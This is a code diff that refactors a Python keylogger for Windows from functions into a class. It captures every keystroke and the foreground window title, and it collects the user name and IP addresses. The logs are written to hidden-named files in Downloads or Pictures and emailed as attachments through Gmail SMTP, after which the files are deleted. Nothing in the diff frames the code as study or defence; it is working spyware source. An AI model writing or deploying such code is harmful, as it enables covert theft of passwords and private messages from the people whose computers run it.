@@ -13,126 +13,141 @@ from email import encoders
 import threading
 import config
 
-datetime = time.ctime(time.time())
-user = os.path.expanduser('~').split('\\')[2]
-publicIP = requests.get('https://api.ipify.org/').text
-privateIP = socket.gethostbyname(socket.gethostname())
 
-msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ ' \
-      f'Private-IP: {privateIP}\n\n '
-logged_data = [msg]
+class keylog:
+    def __init__(self):
+        self.dateTime = time.ctime(time.time())
+        self.user = os.path.expanduser('~').split('\\')[2]
+        self.publicIP = requests.get('https://api.ipify.org').text
+        self.privateIP = socket.gethostbyname(socket.gethostname())
 
-old_app = ''
-delete_file = []
+        self.msg = f'[START OF LOGS]\n  > Date/Time: {self.dateTime}\n  > User-Profile: {self.user}\n  > Public-IP: {self.publicIP}\n  > Private-IP: {self.privateIP}\n\n '
+        self.loggedData = [self.msg]
 
+        self.oldApp = ''
+        self.newApp = None
+        self.deleteFile = []
 
-def onPress(key):
-    global old_app
+        self.one = os.path.expanduser('~') + '/Pictures/'
+        self.two = os.path.expanduser('~') + '/Downloads/'
 
-    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        self.fromAddr = config.fromAddr
+        self.fromPswd = config.fromPswd
+        self.toAddr = self.fromAddr
 
-    if new_app == 'Cortana':
-        new_app = 'Windows Start Menu'
-    else:
-        pass
+    def onPress(self, key):
+        self.newApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
-    if new_app != old_app and new_app != '':
-        logged_data.append(f'[{datetime}] ~ {new_app}\n')
-        old_app = new_app
-    else:
-        pass
+        if self.newApp == 'Cortana':
+            self.newApp = 'Windows Start Menu'
+        else:
+            pass
 
-    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
-                    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
-                    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
-                    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
-                    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
+        if self.newApp != self.oldApp and self.newApp != '':
+            self.loggedData.append(f'[{self.dateTime}] ~ {self.newApp}\n')
+            self.oldApp = self.newApp
+        else:
+            pass
 
-    key = str(key).strip('\'')
-    if key in substitution:
-        logged_data.append(substitution[substitution.index(key) + 1])
-    else:
-        logged_data.append(key)
+        substitution = {
+            'Key.enter': '[ENTER]\n',
+            'Key.backspace': '[BACKSPACE]',
+            'Key.space': ' ',
+            'Key.alt_l': '[ALT]',
+            'Key.tab': '[TAB]',
+            'Key.delete': '[DEL]',
+            'Key.ctrl_l': '[CTRL]',
+            'Key.left': '[LEFT ARROW]',
+            'Key.right': '[RIGHT ARROW]',
+            'Key.shift': '[SHIFT]',
+            '\\x13': '[CTRL+S]',
+            '\\x17': '[CTRL+W]',
+            'Key.caps_lock': '[CAPS LK]',
+            '\\x01': '[CTRL+A]',
+            'Key.cmd': '[WINDOWS KEY]',
+            'Key.print_screen': '[PRT SCR]',
+            '\\x03': '[CTRL+C]',
+            '\\x16': '[CTRL+V]'
+        }
 
+        key = str(key).strip('\'')
+        if key in substitution:
+            self.loggedData.append(substitution[key])
+        else:
+            self.loggedData.append(key)
 
-def writeFile(count):
-    one = os.path.expanduser('~') + '/Downloads/'
-    two = os.path.expanduser('~') + '/Pictures/'
-    # three = 'C:/'
-    list = [one, two]
+    def writeFile(self, count):
+        pathList = [self.one, self.two]
 
-    filepath = random.choice(list)
-    filename = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
-    file = filepath + filename
-    delete_file.append(file)
+        filePath = random.choice(pathList)
+        fileName = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
+        file = filePath + fileName
+        print(file)
+        self.deleteFile.append(file)
 
-    with open(file, 'w') as fp:
-        fp.write(''.join(logged_data))
-    print('written all good')
+        with open(file, 'w') as fp:
+            fp.write(''.join(self.loggedData))
+        print('written all data')
 
+    def sendLogs(self):
+        count = 0
 
-def sendLogs():
-    count = 0
+        time.sleep(30)
+        while True:
+            if len(self.loggedData) > 1:
+                try:
+                    self.writeFile(count)
 
-    fromAddr = config.fromAddr
-    fromPswd = config.fromPswd
-    toAddr = fromAddr
+                    subject = f'[{self.user}] ~ {count}'
 
-    time.sleep(30)  # for debugging ~ yes program works :)
-    while True:
-        if len(logged_data) > 1:
-            try:
-                writeFile(count)
+                    msg = MIMEMultipart()
+                    msg['From'] = self.fromAddr
+                    msg['To'] = self.toAddr
+                    msg['Subject'] = subject
+                    body = f'Keylog report of {self.user}'
+                    msg.attach(MIMEText(body, 'plain'))
 
-                subject = f'[{user}] ~ {count}'
+                    attachment = open(self.deleteFile[0], 'rb')
+                    print('attachment')
 
-                msg = MIMEMultipart()
-                msg['From'] = fromAddr
-                msg['To'] = toAddr
-                msg['Subject'] = subject
-                body = 'testing'
-                msg.attach(MIMEText(body, 'plain'))
+                    fileName = self.deleteFile[0].split('/')[2]
 
-                attachment = open(delete_file[0], 'rb')
-                print('attachment')
+                    part = MIMEBase('application', 'octect-stream')
+                    part.set_payload(attachment.read())
+                    encoders.encode_base64(part)
+                    part.add_header('content-disposition', 'attachment;fileName=' + str(fileName))
+                    msg.attach(part)
 
-                filename = delete_file[0].split('/')[2]
+                    text = msg.as_string()
+                    print('test msg.as_string')
 
-                part = MIMEBase('application', 'octect-stream')
-                part.set_payload(attachment.read())
-                encoders.encode_base64(part)
-                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
-                msg.attach(part)
+                    s = smtplib.SMTP('smtp.gmail.com', 587)
+                    s.ehlo()
+                    s.starttls()
+                    print('starttls')
+                    s.ehlo()
+                    s.login(self.fromAddr, self.fromPswd)
+                    s.sendmail(self.fromAddr, self.toAddr, text)
+                    print('sent mail')
+                    attachment.close()
+                    s.close()
 
-                text = msg.as_string()
-                print('test msg.as_string')
+                    os.remove(self.deleteFile[0])
+                    del self.loggedData[1:]
+                    del self.deleteFile[0:]
+                    print('delete data/files')
 
-                s = smtplib.SMTP('smtp.gmail.com', 587)
-                s.ehlo()
-                s.starttls()
-                print('starttls')
-                s.ehlo()
-                s.login(fromAddr, fromPswd)
-                s.sendmail(fromAddr, toAddr, text)
-                print('sent mail')
-                attachment.close()
-                s.close()
+                    count += 1
 
-                os.remove(delete_file[0])
-                del logged_data[1:]
-                del delete_file[0:]
-                print('delete data/files')
-
-                count += 1
-
-            except Exception as errorString:
-                print('[!] sendLogs // Error.. ~ %s' % errorString)
-                pass
+                except Exception as e:
+                    print('[!] sendLogs // Error.. ~ %s' % e)
+                    pass
 
 
 if __name__ == '__main__':
-    T1 = threading.Thread(target=sendLogs)
+    k = keylog()
+    T1 = threading.Thread(target=k.sendLogs)
     T1.start()
 
-    with Listener(on_press=onPress) as listener:
+    with Listener(on_press=k.onPress) as listener:
         listener.join()
